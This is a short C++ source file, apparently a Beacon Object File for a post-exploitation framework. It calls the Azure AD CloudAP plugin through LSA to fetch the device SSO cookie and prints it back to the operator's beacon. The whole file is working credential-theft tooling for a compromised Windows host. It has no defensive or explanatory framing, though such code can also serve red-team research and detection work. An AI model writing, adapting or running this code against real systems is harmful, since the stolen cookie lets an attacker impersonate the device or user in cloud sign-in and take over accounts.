// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"
#include <stdio.h>

GUID AadGlobalIdProviderGuid = { 0xB16898C6, 0xA148, 0x4967, 0x91, 0x71, 0x64, 0xD7, 0x55, 0xDA, 0x85, 0x20 };

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    Libc::CHAR_SPAN submitBuffer;
    PIC_STRING(json, "{\"call\":4}");
    submitBuffer.data = const_cast<char*>(json);
    submitBuffer.count = Libc::strlen(submitBuffer.data) + 1;
    Libc::CHAR_SPAN returnBuffer;
    if (LsaApi::CallCloudapPlugin(&AadGlobalIdProviderGuid, &submitBuffer, &returnBuffer)) {
        PIC_STRING(message, "%s\n");
        BeaconPrintf(CallbackType::OUTPUT, message, reinterpret_cast<char*>(returnBuffer.data));
        PIC_WSTRING(sspicli, L"SSPICLI.DLL");
        LAZY_LOAD_PROC(sspicli, LsaFreeReturnBuffer);
        LazyLsaFreeReturnBuffer(returnBuffer.data);
    } else {
        PIC_STRING(message, "Failed to get the device sso cookie.\n");
        BeaconPrintf(CallbackType::ERROR, message);
    }
}